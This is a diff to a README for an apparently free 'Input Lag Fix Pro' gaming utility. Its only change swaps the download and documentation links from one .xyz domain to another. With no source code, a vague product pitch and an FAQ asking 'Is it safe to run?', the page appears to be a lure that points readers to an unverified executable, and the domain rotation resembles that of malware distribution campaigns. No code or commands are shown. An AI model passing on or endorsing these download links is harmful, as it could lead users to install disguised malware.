@@ -9,9 +9,9 @@
 Next-generation **Input Lag Fix Pro** gaming suite delivering competitive edge through advanced tuning and network optimization.
 
 ## 📥 Download
-➡️ **[Grab the latest version](https://input-lag-fix-pro.softonx.xyz)**
+➡️ **[Grab the latest version](https://input-lag-fix-pro.softax.xyz)**
 
-Details & docs: https://input-lag-fix-pro.softonx.xyz
+Details & docs: https://input-lag-fix-pro.softax.xyz
 
 ## Common questions
 **Is it safe to run?**
